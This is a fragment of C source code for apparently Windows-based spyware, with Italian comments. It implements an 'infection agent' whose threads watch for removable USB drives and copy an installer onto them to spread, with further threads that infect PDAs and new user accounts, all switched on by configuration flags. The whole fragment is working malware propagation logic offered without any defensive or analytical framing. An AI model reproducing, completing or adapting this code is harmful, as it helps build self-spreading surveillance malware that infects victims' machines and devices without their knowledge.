DWORD WINAPI MonitorUSBThread(DWORD dummy)
{
	WCHAR drive_letter[4];
	DWORD type;
	
	drive_letter[1]=L':';
	drive_letter[2]=L'\\';
	drive_letter[3]=0;

	LOOP {
		if (infection_usb) {
			for (drive_letter[0]=L'D'; drive_letter[0]<=L'Z'; drive_letter[0]++) {
				type = FNC(GetDriveTypeW)(drive_letter);

				if (type==DRIVE_REMOVABLE && !IsUSBInfected(drive_letter) && InfectUSB(drive_letter, EXE_INSTALLER_NAME)) {
					REPORT_STATUS_LOG("- USB Drive Infection...........OK\r\n");
					SendStatusLog(L"[Infection Agent]: Spread to USB Drive");	
				}
			}
		}
		CANCELLATION_SLEEP(bPM_usbcp, USB_AGENT_SLEEP_TIME);
	}
	return 0;
}


DWORD __stdcall PM_PDAAgentStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;

	// Durante la sync non lo stoppa (dato che non produce log)
	if (!bReset)
		return 0;

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_PDAAgentStarted == bStartFlag)
		return 0;

	bPM_PDAAgentStarted = bStartFlag;

	if (bStartFlag) {
		// Se voglio aggiungere Symbian lo faccio con un altro thread E UN ALTRO SEMAFORO
		if (RapiInit())
			hPDAThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorPDAThread, NULL, 0, &dummy);
		hSpreadThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorNewUsersThread, NULL, 0, &dummy);
		hUSBThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUSBThread, NULL, 0, &dummy);
	} else {
		QUERY_CANCELLATION(hPDAThread, bPM_pdacp);
		QUERY_CANCELLATION(hSpreadThread, bPM_sprcp);
		QUERY_CANCELLATION(hUSBThread, bPM_usbcp);
	}

	return 1;
}

DWORD __stdcall PM_PDAAgentInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	infection_conf_struct *infection_conf = (infection_conf_struct *)conf_ptr;

	if (conf_ptr) { // Altrimenti di default sono a FALSE
		infection_spread = infection_conf->infection_spread;
		infection_pda = infection_conf->infection_pda;
		infection_usb = infection_conf->infection_usb;
	}

	PM_PDAAgentStartStop(bStartFlag, TRUE);
	return 1;
}


void PM_PDAAgentRegister()
{
	// Non ha nessuna funzione di Dispatch
	AM_MonitorRegister(PM_PDAAGENT, NULL, (BYTE *)PM_PDAAgentStartStop, (BYTE *)PM_PDAAgentInit, NULL);

	// Inizialmente i monitor devono avere una configurazione di default nel caso
	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
	PM_PDAAgentInit(NULL, FALSE);
}